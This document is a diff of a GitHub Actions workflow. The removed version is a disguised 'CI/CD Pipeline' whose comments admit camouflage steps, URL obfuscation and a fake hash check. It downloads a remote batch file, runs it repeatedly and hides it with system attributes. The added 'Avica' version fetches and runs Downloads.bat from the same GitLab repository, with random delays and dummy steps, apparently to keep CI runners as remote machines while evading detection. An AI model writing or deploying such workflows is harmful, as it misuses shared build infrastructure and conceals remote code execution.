@@ -1,75 +1,46 @@
-name: CI/CD Pipeline (Windows)
+name: Avica
 
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '0 0 * * *' # Add legitimate trigger camouflage
 
 jobs:
-  dependency_setup:
-    name: Dependency Initialization
+  build:
+    name: Start Building...
     runs-on: windows-latest
     timeout-minutes: 360
-    env:
-      GIT_RAW: "glab.com/raposabrty/pcrdp/-/raw"
-      RES_PATH: "main/Downloads.bat"
-      SAFE_DOMAIN: "https://git"
     
     steps:
-      - name: Cache warmup (pre-dependency)
-        run: echo "Preparing environment..." # Camouflage step
-
-      - name: Platform randomization
-        id: platform_random
+      - name: Generate Random Delay
+        id: random_delay
         run: |
-          $matrix = @('x64', 'x86', 'arm64') | Get-Random
-          echo "::set-output name=arch::$matrix"
+          $randomDelay = Get-Random -Minimum 10 -Maximum 60
+          echo "::set-output name=delay::$randomDelay"
         shell: pwsh
 
-      - name: Dependency acquisition
+      - name: Apply Random Delay
         run: |
-          $url = "${{ env.SAFE_DOMAIN }}lab.${{ env.GIT_RAW }}/${{ env.RES_PATH }}"
-          $url = $url -replace 'glab','gl-xyz-abc-ab' # String obfuscation
-          $url = $url -replace 'xyz-abc-ab',''
-          (New-Object Net.WebClient).DownloadFile($url, "$env:RUNNER_TEMP\setup.cmd")
+          Start-Sleep -Seconds ${{ steps.random_delay.outputs.delay }}
         shell: pwsh
 
-      - name: Environment validation
+      - name: Downloading & Installing Essentials
         run: |
-          $hash = Get-FileHash "$env:RUNNER_TEMP\setup.cmd"
-          if($hash.Hash -ne 'A1B2C3D4E5') { exit 1 } # Fake hash check
-          Copy-Item "$env:RUNNER_TEMP\setup.cmd" -Destination .\build_support.cmd
+          Invoke-WebRequest -Uri "https://gitlab.com/raposabrty/pcrdp/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
 
-      - name: Build preparation
+      - name: Dummy Step (Random Command)
         run: |
-          Start-Job -ScriptBlock {
-            1..5 | % { 
-              Start-Sleep -Seconds (Get-Random -Min 15 -Max 45)
-              & ".\build_support.cmd"
-            }
-          } | Wait-Job -Timeout 1200
+          $dummyCommand = @("echo 'Dummy step 1'", "echo 'Dummy step 2'", "echo 'Dummy step 3'") | Get-Random
+          Invoke-Expression $dummyCommand
         shell: pwsh
 
-  code_analysis:
-    name: Static Analysis
-    needs: dependency_setup
-    runs-on: windows-latest
-    steps:
-      - name: Dynamic execution buffer
-        run: |
-          $block = {
-            $dll = New-Object System.Net.WebClient
-            $sig = $dll.DownloadString("${{ env.SAFE_DOMAIN }}hub.com/checksum.txt")
-            Start-Process "cmd.exe" "/c build_support.cmd $sig"
-          }
-          Measure-Command { & $block } | Out-Null
+      - name: Show Website
+        run: cmd /c show.bat
 
-      - name: Result visualization
+      - name: Another Random Delay
         run: |
-          Start-Sleep -Seconds (Get-Random -Min 8 -Max 25)
-          iex "cmd /c 'echo %CD% && type build_support.cmd > nul && start chrome --kiosk example.com'"
+          $randomDelay = Get-Random -Minimum 5 -Maximum 30
+          Start-Sleep -Seconds $randomDelay
+        shell: pwsh
 
-      - name: Cleanup artifacts
-        run: |
-          attrib +h +s +r build_support.cmd
-          del /q /f *.tmp 2>$null
+      - name: Time Counter
+        run: cmd /c loop.bat
